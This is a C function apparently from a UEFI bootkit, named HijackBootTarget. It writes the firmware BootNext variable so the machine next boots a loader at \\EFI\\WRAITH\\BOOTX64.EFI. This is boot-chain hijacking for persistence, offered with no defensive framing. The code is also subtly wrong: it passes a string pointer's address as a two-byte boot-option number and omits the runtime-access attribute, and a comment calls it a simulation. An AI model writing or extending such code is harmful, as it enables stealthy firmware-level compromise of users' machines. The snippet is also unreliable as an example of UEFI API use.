EFI_STATUS HijackBootTarget(EFI_SYSTEM_TABLE *SystemTable)
{
    CHAR16 *NewBootPath = L"\\EFI\\WRAITH\\BOOTX64.EFI";

    // Simulate NVRAM variable set or use EFI_LOAD_OPTION
    SystemTable->RuntimeServices->SetVariable(
        L"BootNext",
        &gEfiGlobalVariableGuid,
        EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS,
        sizeof(UINT16),
        (VOID *)&NewBootPath);

    return EFI_SUCCESS;
}